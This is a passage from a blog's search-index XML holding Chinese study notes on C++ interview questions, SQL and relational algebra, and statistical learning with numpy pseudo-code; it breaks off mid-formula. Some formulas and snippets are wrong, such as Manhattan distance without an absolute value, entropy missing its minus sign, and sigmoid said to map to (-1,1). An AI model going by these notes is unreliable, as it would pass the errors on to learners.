      <url>/2021/04/08/2021-04-08-%E5%9B%BE%E5%83%8F%E8%A7%86%E9%A2%91%E4%BF%A1%E6%81%AF%E6%8F%90%E5%8F%96%E4%B8%8E%E6%A3%80%E7%B4%A2/</url>
      
        <content type="html"><![CDATA[<p>写在前面：跨媒体检索方向涵盖许多任务，涉及到图像、文本、语音、视频等多种模态的数据，事实上，根据项目需求，开发者可以将所需的识别、分割、生成、编码方法集成到检索项目中。本文整理了在网络上能搜集到的Baidu、Youtube、Google、Facebook检索系统和大数据架构实现方案，给以后的工作方向做参考。</p><a id="more"></a><h2 id="思维导图siweidaotu"><a href="#思维导图siweidaotu" class="headerlink" title="思维导图siweidaotu"></a>思维导图siweidaotu</h2>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ML </tag>
            
            <tag> DL </tag>
            
            <tag> Paper </tag>
            
            <tag> MultiModal </tag>
            
            <tag> MultiMedia </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CPP面试知识点</title>
      <link href="/2021/03/26/2021-03-26-cpp%E9%9D%A2%E8%AF%95%E7%9F%A5%E8%AF%86/"/>
      <url>/2021/03/26/2021-03-26-cpp%E9%9D%A2%E8%AF%95%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<p>持续更新</p><a id="more"></a><h2 id="概念性区分"><a href="#概念性区分" class="headerlink" title="概念性区分"></a>概念性区分</h2><p><strong>1.C和C++的区别</strong><br>C面向过程，C++面向对象<br>C的内存管理使用malloc free，C++还可以使用new delete<br>C不支持函数重载，C++支持函数重载<br>C没有引用，C++可以用引用<br><strong>堆和栈的区别</strong><br>stack编译器自动分配和释放，自底向上的数据结构<br>heap需要由程序员手动new delete，会产生外部碎片，是自上到下的数据结构<br><strong>c++中不能被继承的成员函数</strong><br>析构函数和构造函数<br><strong>const</strong><br>定义常量<br>修饰函数参数和函数返回值</p><h2 id="修饰函数定义体，函数为类的成员函数，const修饰后的成员函数不修改成员变量的值"><a href="#修饰函数定义体，函数为类的成员函数，const修饰后的成员函数不修改成员变量的值" class="headerlink" title="修饰函数定义体，函数为类的成员函数，const修饰后的成员函数不修改成员变量的值"></a>修饰函数定义体，函数为类的成员函数，const修饰后的成员函数不修改成员变量的值</h2><p>define给一个立即数，const是常量，放在静态区域，全局变量也在静态区域<br>静态区：static无论是全局变量还是局部变量都存储在全局/静态区域，在编译期就为其分配内存，在程序结束时释放<br>const的全局变量存储在只读数据段，第一次使用时被分配内存，结束时释放；const的局部变量存在栈中，代码块结束释放<br>define定义的常量不可以用指针去指向，const定义的常量可以用指针去指向该常量的地址<br>–const优点<br>const 常量有数据类型，而宏常量没有数据类型。<br>编译器可以对前者进行类型安全检查，<br>后者只进行字符替换，没有类型安全检查，并且在字符替换可能报错。<br>[全局变量放在静态存储区，整个程序开始分配内存，结束释放]<br><strong>static</strong><br>static修饰的变量只能通过其所在文件、模块或函数进行调用，限制变量<br>static修饰的变量一开始就得初始化，并存放于静态内存区<br><strong>volatile</strong><br>本条指令不会因编译器的优化而省略，不会被编译器察觉（隐藏变量），且要求每次重新读取volatile修饰的变量的内容<br><strong>extern</strong></p><p><strong>指针和引用的区别</strong><br>引用本质是只读指针，引用只能在初始化时被赋值,且必须被初始化，之后不能改变，指针是动态的<br>引用不能为NULL，指针可以<br>引用做函数参数时，内部传递的是变量地址<br><strong>进程间通信</strong><br>pipe管道，半双工，用于父子进程通信<br>semaphore信号量，进程同步访问共享资源<br>message que 消息队列，克服了缓冲区限制<br>shared memory共享内存<br>socket<br><strong>线程间通信</strong><br>全局变量   Messages消息机制；<br>CEvent对象（MFC中的一种线程通信对象，通过其触发状态的改变实现同步与通信）</p><p>编译时运算符:sizeof</p><p><strong>写一个函数指针</strong><br><em>( ( void (</em>)() ) 0x100000) ( );<br>void(<em>)()强制转换0x100000<br>typedef void(</em>)() voidFunc;<br>*(  (voidFunc)0x100000 )();</p><p><strong>内存分配方式</strong></p><p>从静态存储区域分配。内存在程序编译的时候就已经分配好，这块内存在程序的整个运行期间都存在。例如全局变量。</p><p>在栈上创建。在执行函数时，函数内局部变量的存储单元都可以在栈上创建，函数执行结束时这些存储单元自动被释放。栈内存分配运算内置于处理器的指令集中，效率很高，但是分配的内存容量有限。</p><p>从堆上分配，亦称动态内存分配。程序在运行的时候用malloc或new申请任意多少的内存，程序员自己负责在何时用free或delete释放内存。动态内存的生存期由我们决定，使用非常灵活，但问题也最多。</p>]]></content>
      
      
      <categories>
          
          <category> CPP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CPP，面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>模型集成策略</title>
      <link href="/2021/01/12/2021-01-12-%E6%A8%A1%E5%9E%8B%E9%9B%86%E6%88%90/"/>
      <url>/2021/01/12/2021-01-12-%E6%A8%A1%E5%9E%8B%E9%9B%86%E6%88%90/</url>
      
        <content type="html"><![CDATA[<p>新坑</p><a id="more"></a><h2 id="stacking"><a href="#stacking" class="headerlink" title="stacking"></a>stacking</h2>]]></content>
      
      
      <categories>
          
          <category> ML </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ML </tag>
            
            <tag> DL </tag>
            
            <tag> stacking </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库系统相关</title>
      <link href="/2021/01/11/2021-01-11-%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
      <url>/2021/01/11/2021-01-11-%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<p>关于计算机研究生复试的数据库相关问题（笔试）</p><a id="more"></a><h2 id="系统概念相关"><a href="#系统概念相关" class="headerlink" title="系统概念相关"></a>系统概念相关</h2><p>数据视图<br>数据抽象： 物理层–&gt;逻辑层–&gt;视图层<br>实例和模式：物理模式–&gt;逻辑模式–&gt;子模式<br>数据集合是实例(Instance)， 数据库总体设计为数据库模式(Schema)<br>数据模型： 关系模型  实体-联系模型（E-R)  基于对象的模型  半结构化数据模型</p><h2 id="关系运算"><a href="#关系运算" class="headerlink" title="关系运算"></a>关系运算</h2><p>域：关系中的某属性允许取值的集合<br><strong>码</strong>：整个关系中区分不同元组的一种性质<br>超码 super key：一个或多个属性的集合，唯一标识一个元组,允许有多余的属性<br>候选码 candidate key：允许最少必要属性的超码即候选码比如{ID}{name,seat}是两个候选码<br>主码 primary key：设计者在一个关系内的候选码中选择的区分元组的属性组合<br>主码选择原则：选择那些值从不改变或极少改变的候选码作primary key<br>外码 foreign key：一个关系内的某属性是另一个关系的主码</p><p><strong>关系代数</strong></p><ul><li>选择元组/属性 σ</li><li>投影 π</li><li>自然连接 ∞</li><li>笛卡尔积 X</li><li>集合运算 交 并</li></ul><h2 id="自然连接举例"><a href="#自然连接举例" class="headerlink" title="自然连接举例"></a>自然连接举例</h2><table><thead><tr><th align="center">A</th><th align="center">B</th><th align="center">C</th><th></th><th align="center">D</th><th align="center">B</th><th align="center">E</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">a</td><td align="center">3</td><td></td><td align="center">2</td><td align="center">c</td><td align="center">7</td></tr><tr><td align="center">2</td><td align="center">b</td><td align="center">6</td><td></td><td align="center">3</td><td align="center">d</td><td align="center">5</td></tr><tr><td align="center">3</td><td align="center">c</td><td align="center">7</td><td></td><td align="center">1</td><td align="center">a</td><td align="center">3</td></tr><tr><td align="center">* 计算笛卡尔积</td><td align="center"></td><td align="center"></td><td></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">* 选出左B=右B的元组，不等的不算，忽略掉</td><td align="center"></td><td align="center"></td><td></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">* 合并该元组，成为新元组 A B C D E ，成为新元组的只有两组</td><td align="center"></td><td align="center"></td><td></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">1</td><td align="center">a</td><td align="center">3</td><td>1</td><td align="center">3</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">3</td><td align="center">c</td><td align="center">7</td><td>2</td><td align="center">7</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">## SQL相关</td><td align="center"></td><td align="center"></td><td></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">自然连接 nature join 和join using(某个属性)</td><td align="center"></td><td align="center"></td><td></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">并运算：union 自动去重 union all 可以保留重复</td><td align="center"></td><td align="center"></td><td></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">交运算：intersect 自动去重 intersect all 可保留重复</td><td align="center"></td><td align="center"></td><td></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">差运算：except 自动去重 except all 可保留重复</td><td align="center"></td><td align="center"></td><td></td><td align="center"></td><td align="center"></td><td align="center"></td></tr></tbody></table><p>聚集函数：sum, min , max , count , avg<br>分组聚集： group by中没有出现的属性，只要是出现在select中，必须在聚集函数内部的形式出现,比如b,c没出现在group by 内部，用例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> a,<span class="keyword">avg</span>(b),<span class="keyword">sum</span>(c) <span class="keyword">from</span> table1 <span class="keyword">group</span> <span class="keyword">by</span> a;</span><br></pre></td></tr></table></figure><p>集合成员资格：in ,not in<br>集合比较：some运算,用例</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">ID</span> <span class="keyword">from</span> instructor </span><br><span class="line"><span class="keyword">where</span> salary &gt;<span class="keyword">some</span> (<span class="keyword">select</span> salary <span class="keyword">from</span> instructor </span><br><span class="line">    <span class="keyword">where</span> department = <span class="string">'bio'</span>);</span><br><span class="line">等价于</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">distinct</span> T.ID <span class="keyword">from</span> instructor <span class="keyword">as</span> T,instructor <span class="keyword">as</span> S </span><br><span class="line"><span class="keyword">where</span> S.department =<span class="string">'bio'</span> <span class="keyword">and</span> T.salary &gt;S.salary;</span><br></pre></td></tr></table></figure><p>空关系测试：exists, not exists,测试子查询结果中是否存在元组，用例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">DSC黑书第六版中的，“找出选修了bio系开设的所有课程的学生”（表在官网</span><br><span class="line"><span class="keyword">select</span> S.ID,S.name <span class="keyword">from</span> student <span class="keyword">as</span> S </span><br><span class="line"><span class="keyword">where</span> <span class="keyword">not</span> <span class="keyword">exists</span>( (<span class="keyword">select</span> course_id <span class="keyword">from</span> course</span><br><span class="line">   <span class="keyword">where</span> dep_name = <span class="string">'bio'</span>)//找出bio系开设的所有课程</span><br><span class="line">   <span class="keyword">except</span></span><br><span class="line">       (<span class="keyword">select</span> T.course_id <span class="keyword">from</span> takes <span class="keyword">as</span> T</span><br><span class="line">   <span class="keyword">where</span> S.ID = T.ID) );//找出S.ID选修的所有课程</span><br></pre></td></tr></table></figure><p>重复元组存在性测试：unique，测试子查询返回集合是否有重复元组，无则返回true；not unique则相反</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DSC黑书第六版中的，“找出所有在2019年最多开设一次的课程”</span><br><span class="line"><span class="keyword">select</span> C.course_id <span class="keyword">from</span> course <span class="keyword">as</span> C</span><br><span class="line"><span class="keyword">where</span> <span class="keyword">unique</span> (<span class="keyword">select</span> S.course_id <span class="keyword">from</span> <span class="keyword">section</span> <span class="keyword">as</span> S</span><br><span class="line">      <span class="keyword">where</span> C.course_id =S.course_id  <span class="keyword">and</span> S.year =<span class="number">2019</span>);</span><br></pre></td></tr></table></figure><p>标量子查询：子查询只返回包括【单个属性】的【单个元组】，只可以出现在select where having三种子句中</p><h2 id="关系代数"><a href="#关系代数" class="headerlink" title="关系代数"></a>关系代数</h2>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>统计学习笔记</title>
      <link href="/2020/09/11/2020-09-12-statics_note/"/>
      <url>/2020/09/11/2020-09-12-statics_note/</url>
      
        <content type="html"><![CDATA[<p>该笔记是对李航统计学习方法和All of Statics做的学习笔记，简单进行相关算法实验，加强理解，查缺补漏等，内容尽量精炼</p><a id="more"></a><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><h3 id="生成模型与判别模型"><a href="#生成模型与判别模型" class="headerlink" title="生成模型与判别模型"></a>生成模型与判别模型</h3><p>generative model和discriminative model$（以下分别表示为G和D）$<br>$G\ $常见的有朴素贝叶斯，隐马尔科夫模型，高斯混合、 LDA、 Restricted Boltzmann Machine等<br>$D\ $有Kmeans，感知机，决策树，最大熵模型，Logistic回归、SVM、 boosting、条件随机场、神经网络等<br>两者的本质区别及特点：<br>$G\ $的流程是<strong>学习X和Y的联合概率分布$P(x,y)$得出$P(y|x)$最直接的例子就是Naive Bayes</strong>，由于生成的结果是联合分布$P(x,y)$，可以计算边缘分布$P(x)$进行异常值检测，若$P(x)$太小，就判定可能不适合这一类样本所代表的数据。<br>$D\ $的流程是<strong>直接由给定的X，Y学习决策函数或$P(y|x)$，是一种黑盒操作，准确率高，可以将允许对问题进行抽象处理，最熟悉的例子就是Neural Network</strong></p><h3 id="分类问题和回归问题"><a href="#分类问题和回归问题" class="headerlink" title="分类问题和回归问题"></a>分类问题和回归问题</h3><p>分类用CrossEntropy，回归用Mean Square Error等等</p><h3 id="范数-norm"><a href="#范数-norm" class="headerlink" title="范数 norm"></a>范数 norm</h3><p>$L1范数 \sum{|x_i|}$<br>$L2范数 \sqrt{x_{1}^{2} + x_{2}^{2} + … + x_{n}^{2}}$<br>$L_\infty无穷范数MAX{|x_i|}$<br>范数理论推论$L1\geq{L2\geq{L_\infty}}$<br>对于numpy的线性代数库，有几种求范数的方法，主要就是求这三种</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">np.linalg.norm(x, ord=<span class="literal">None</span>, axis=<span class="literal">None</span>, keepdims=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>axis=0表示对矩阵x的每一列求范数，axis=1表示对矩阵的每一行求范数， keeptdims=True表示结果保留维度，keepdims=False表示结果不保留维度</p><h3 id="最小二乘"><a href="#最小二乘" class="headerlink" title="最小二乘"></a>最小二乘</h3><p>是解决曲线拟合问题、最小化cost的优化方法，使求得的数据与实际数据之间的误差平方和最小，应用范围非常广泛。<br>$设(x,y)为一组观测量，x=[x_0,x_1,…,x_n]^T,寻找一个函数y=f(x,w)$ ，使$尽可能逼近曲线(x,y),其中w=[w_0,w_1,…,w_n]^T$，为待估计参数，求解<br>使残差函数$$L(y,f(x,w))=\sum{[y_i-f(x_i,w_i)]^2}$$得到<strong>全局</strong>最小值的$w$,直观上就是每个点与拟合曲线的欧氏距离的平方和。</p><p><em>与梯度下降的区别：</em><br>最小二乘法是指对$\Delta$求导找出函数全局最小的w，梯度下降是先给定一个w（初始化），经过N次梯度下降后找到的使函数局部最小的w。相对的，梯度下降适用于大规模数据，最小二乘适用于较小样本，不过梯度下降的缺点是到最小点的时候收敛速度变、对初始点的选择极为敏感两个方面。</p><h2 id="感知机-perceptron"><a href="#感知机-perceptron" class="headerlink" title="感知机 perceptron"></a>感知机 perceptron</h2><p>属于$Discriminative \ Model$的线性分类模型，输入是表示一个Instance的特征向量，求出分离特征的超平面，公式表示为：<br>$f(x) = sign(w*x+b)$<br>$\begin{eqnarray}<br>sign(x)=  \begin{cases}<br>1,&amp;x\geq{0}  \cr<br>-1 ,&amp;x&lt;0<br>\end{cases}<br>\end{eqnarray}$<br>这种perceptron叠起来就相当于是全连接的MLP(Multi-Layer Perceptron)</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/MLP.gif" alt title>                </div>                <div class="image-caption"></div>            </figure><p>n多个线性函数叠加，对应矩阵运算$W\cdot x + B$，$W是w权重矩阵，B是bias的列向量，激活函数对应单个感知机的sign函数$</p><h2 id="k-近邻-k-nearest-neighbor"><a href="#k-近邻-k-nearest-neighbor" class="headerlink" title="k-近邻 k nearest neighbor"></a>k-近邻 k nearest neighbor</h2><p>还是属于$Discriminative \ Model$的模型，复杂度为$O(n^2)$，由三个基本要素组成：<strong>距离度量、k值、分类规则</strong><br>距离度量，设有向量x1和x2，则：<br>欧氏距离<code>np.sqrt(np.sum(np.square(x1 - x2)))</code><br>或直接<code>np.linalg.norm(x1-x2)</code>（用numpy的线性代数库求L2范数，但后者较慢）<br>曼哈顿距离<code>np.sum(x1 - x2)</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">input:px,k</span><br><span class="line"><span class="keyword">return</span>:bestx</span><br><span class="line"><span class="comment"># get N(x):涵盖最近的k个点的邻域，即KList</span></span><br><span class="line">distList = []</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> X:</span><br><span class="line">distList.append(np.sqrt(np.sum(np.square(px - x))))</span><br><span class="line">KList = np.argsort(np.array(distList))[:k]</span><br><span class="line"><span class="comment"># 决策规则I:由KList得出bestx，以类别分类问题为例，选N(x)最多类别为结果</span></span><br><span class="line">X(np.argmax(np.bincount(X(i))))</span><br></pre></td></tr></table></figure><p>如果要求多个最大值索引<br><code>np.where(a == np.amax(a))[0]</code>，或者<code>np.argwhere(a == np.amax(a))</code></p><h3 id="kd-tree"><a href="#kd-tree" class="headerlink" title="kd tree"></a>kd tree</h3><p>存储k维空间数据的树结构，实现如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">伪码写好了（？），但是按手里的数据感觉不太好写，回头看看别人有没有demo，先摸了</span><br></pre></td></tr></table></figure><h2 id="朴素贝叶斯-Naive-Bayes"><a href="#朴素贝叶斯-Naive-Bayes" class="headerlink" title="朴素贝叶斯 Naive Bayes"></a>朴素贝叶斯 Naive Bayes</h2><p>属于$Generative \ Model$一类，给的是联合分布$P(x,y)$，学过概率论的应该都会，普通的算法实现如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">input:</span><br><span class="line">先验概率分布P__y : P(Y=c)，条件概率分布P_x_y : P(X=x|Y=c)，dim_f:特征维度</span><br><span class="line">c_num：分类数目，data:数据list，label:标签list，以[<span class="number">0</span>,<span class="number">1</span>,...,<span class="number">9</span>]为例</span><br><span class="line"><span class="keyword">return</span>:max P</span><br><span class="line"></span><br><span class="line"><span class="comment">#求出先验分布，并对数化，经常使用的对乘法处理的方式</span></span><br><span class="line">P__y = [[(np.sum(label == np.asarray(i)))/(len(label))] \</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(c_num)]</span><br><span class="line">P__y = np.log(P__y)</span><br><span class="line"><span class="comment">#求出条件分布</span></span><br><span class="line">P_x_y = np.zeros((c_num, dim_f, <span class="number">2</span>))  </span><br><span class="line"><span class="comment">#对标记集进行遍历  </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(label)):  </span><br><span class="line">    <span class="comment">#获取当前循环所使用的标记  </span></span><br><span class="line">c = label[i]  </span><br><span class="line">    <span class="comment">#获取当前要处理的样本</span></span><br><span class="line">x = data[i]  </span><br><span class="line">    <span class="comment">#对该样本的每一维feature进行遍历</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(dim_f):  </span><br><span class="line">        <span class="comment">#先在矩阵中对应位置加1</span></span><br><span class="line">P_x_y[c][j][x[j]] += <span class="number">1</span>  </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> range(c_num):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(dim_f):  </span><br><span class="line">P_x_y0 = P_x_y[c][j][<span class="number">0</span>]  </span><br><span class="line">P_x_y1 = P_x_y[c][j][<span class="number">1</span>]  </span><br><span class="line">P_x_y[c][j][<span class="number">0</span>] = np.log((P_x_y0 + <span class="number">1</span>) / (P_x_y0 + P_x_y1 + <span class="number">2</span>))</span><br><span class="line">P_x_y[c][j][<span class="number">1</span>] = np.log((P_x_y1 + <span class="number">1</span>) / (P_x_y0 + P_x_y1 + <span class="number">2</span>))</span><br><span class="line"><span class="comment"># pick up最大Probability</span></span><br><span class="line">P = [<span class="number">0</span>] * c_num</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(c_num):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(dim_f):</span><br><span class="line">sum += P_x_y[i][j][x[j]]  </span><br><span class="line">P[i] = sum + P__y[i] </span><br><span class="line">res = P.index(np.amax(P))</span><br></pre></td></tr></table></figure><h2 id="决策树-Decision-Tree-及剪枝"><a href="#决策树-Decision-Tree-及剪枝" class="headerlink" title="决策树 Decision Tree 及剪枝"></a>决策树 Decision Tree 及剪枝</h2><p>决策树是经常在kaggle以及实际应用中很广泛且有效的算法，决策树通常包括3个步骤:<strong>特征选择、构造、剪枝</strong>，<del>无内鬼，直接进行一个sklearn.tree的import</del>，sklearn的tree里封装了BaseDecisionTree，在此基础上进一步封装了DecisionTreeClassifier和DecisionTreeRegressor：分类器和回归器，做kaggle是确实好用。</p><h3 id="特征选择：特征选择的准则是信息增益（information-gain）或信息增益比。"><a href="#特征选择：特征选择的准则是信息增益（information-gain）或信息增益比。" class="headerlink" title="特征选择：特征选择的准则是信息增益（information gain）或信息增益比。"></a>特征选择：特征选择的准则是信息增益（information gain）或信息增益比。</h3><p>$设离散型X的概率分布P(X =x_i)=p_i$<br>$Entropy的定义为H(X)=\sum{p_i\log{p_i}}$</p><h3 id="决策树构造"><a href="#决策树构造" class="headerlink" title="决策树构造"></a>决策树构造</h3><h4 id="ID3"><a href="#ID3" class="headerlink" title="ID3"></a>ID3</h4><p>各个节点用信息增益H(D)准则选择特征，递归构建决策树。<br>ID3算法的核心是在决策树各个结点上应用信息增益准则选择特征，递归地构建决策<br>树。具体方法是：从根结点（root node）开始，对结点计算所有可能的特征的信息增益， 选择信息增益最大的特征作为结点的特征，由该特征的不同取值建立子结点；再对子结点递归调用该方法，直到所有feature被用完或剩余feature的信息增益很小或少于自己设置的阈值，决策树建立完成，缺点是只生成了树，没有【】容易过拟合。</p><h4 id="C4-5"><a href="#C4-5" class="headerlink" title="C4.5"></a>C4.5</h4><p>各个节点用信息增益比选择特征，递归构建决策树，递归函数流程和ID3一样，只是评估标准换成了H(D|A)</p><h4 id="CART"><a href="#CART" class="headerlink" title="CART"></a>CART</h4><p>对回归树用<strong>平方最小误差</strong>原则，对分类树用<strong>基尼指数最小化</strong>原则进行特征选择。</p><h3 id="剪枝"><a href="#剪枝" class="headerlink" title="剪枝"></a>剪枝</h3><p>去掉过于细分的叶结点，使其回退到父结点，甚至更高的结点，然后将父结点或更高的结点改为新的叶结点。</p><p>但是自己还是得从0实现一个决策树，以后用的时候心里有点B数。<br>数据用colab的sampledata里california_housing那个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Logistic-Regression"><a href="#Logistic-Regression" class="headerlink" title="Logistic Regression"></a>Logistic Regression</h2><p>熟悉的Logistic回归，以二分类任务为例，就是用sigmoid函数把结果映射到(-1,1)；多分类任务下，将该二分类任务的sigmoid推广到了softmax函数    ，就是我们熟悉的softmax激活函数。<br>$$Sigmoid(z) = \frac{1}{1+exp(-z)},z=w^T\cdot x,(alias\ Sigmoid(z)=h_w(x))$$<br>$$gradient\ descent:<br>\Delta = x_i \cdot y_i - \frac{np.exp(w\cdot x_i) * x_i)}{ ( 1 + np.exp(w\cdot x_i))}then, \ w=w+lr\cdot\Delta$$<br>或者<br>$$LikelihoodFunc:J(w) =-\frac{1}{m}\sum\limits_{i=1}^{m}{[y_ilog(h_w(x_i))+(1-y_i)log(1-h_w(x_i))]}$$</p><p>$$partial:\frac{\partial J\left(w \right)}{\partial {w}}=\frac{1}{m}\sum\limits_{i=1}^{m}{(h_w(x_i)-{y_i})x_i}$$<br>代码例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#gradient descent</span></span><br><span class="line">x = data <span class="comment"># feature array,default(n,m), gradient dimension is m</span></span><br><span class="line">y = label <span class="comment"># result/ ground truth</span></span><br><span class="line">w = np.zeros(x.shape[<span class="number">1</span>])</span><br><span class="line">iter_num = <span class="number">1000</span></span><br><span class="line">lr = <span class="number">1e-4</span></span><br><span class="line"><span class="keyword">for</span> one_iter <span class="keyword">in</span> range(iter_num):</span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> len(data):</span><br><span class="line"><span class="comment"># 下面xiyi赋值是看着方便，实际上用的时候直接用index取list元素</span></span><br><span class="line">x_i = data[index]</span><br><span class="line">y_i = label[index]</span><br><span class="line"><span class="comment"># 用上面的公式，求partial</span></span><br><span class="line">gradient = x_i*(<span class="number">1</span>/(<span class="number">1</span>+np.exp(np.dot(w,x_i)))-y_i)</span><br><span class="line">w+=gradient*lr</span><br><span class="line">print(<span class="string">"final w:"</span>,w)</span><br></pre></td></tr></table></figure><h2 id="最大熵模型-Max-Entropy-Model"><a href="#最大熵模型-Max-Entropy-Model" class="headerlink" title="最大熵模型 Max Entropy Model"></a>最大熵模型 Max Entropy Model</h2><p><del>复杂度超高，做分类慢的一批</del>，一般用来衡量预测效果的好坏，<del>其实一般也不用</del>。主要是记录一下最大熵模型的思想：将分类等问题作为约束最优化问题，下面的SVM和Adaboost等算法都是采用的约束最优化思想完成的。</p><h2 id="支持向量机-Support-Vector-Machines"><a href="#支持向量机-Support-Vector-Machines" class="headerlink" title="支持向量机 Support Vector Machines"></a>支持向量机 Support Vector Machines</h2><p>间隔最大化的学习策略，可形式化为求解<strong>凸二次规划</strong>问题/正则化的合页损失函数的最小化问题<br>训练数据线性可分，通过硬间隔最大化（hard margin maximization）学习<em>线性可分SVM/硬间隔SVM</em><br>数据近似线性可分，通过软间隔最大化（soft margin maximization）学习<em>线性SVM/软间隔SVM</em><br>数据线性不可分时，通过核函数+软间隔最大化，学习<em>非线性SVM</em>：核函数表示将输入从输入空间映射到特征空间得到的特征向量的内积(点乘)，可以抽象成在高维空间里学习一个线性SVM</p><h3 id="线性SVM"><a href="#线性SVM" class="headerlink" title="线性SVM"></a>线性SVM</h3><p>函数间隔、约束最优化问题</p><ul><li>函数间隔：对于给定数据和超平面wx+b：<br>关于样本点(x,y)的函数间隔为$\gamma_f=y(wx+b)$<br>关于数据集的函数间隔为，所有样本点的最小值，$\gamma_{min}=min(\gamma_f)$</li><li>几何间隔：归一化函数间隔，在法向量正向的几何间隔为$\gamma_g=y(\frac{w}{||w||}\cdot{x}+\frac{b}{||w||}),其中||w||是法向量w的L_2范数$<br>两者关系是$\gamma_f=\gamma_g*||w||$</li><li>间隔最大化，我们为使SVM分类样本点的置信度更大，需要将超平面关于数据集的几何间隔最大化，即求<em>最大几何间隔的超平面</em>，数学描述为：<br>$$max\ \frac{\gamma_f}{||w||}\\ s.t.\ y(wx+b)\geq \gamma_{min}$$<br>由于等式两边在尺度上是一致的，用一下无敌的“不妨设”$\gamma_f = 1$，那么优化目标为w的L2范数的最小值，即<br>$$max\ \frac{\gamma_f}{||w||}等价于求\min{\frac{||w||^2}{2}}\\ s.t.\ 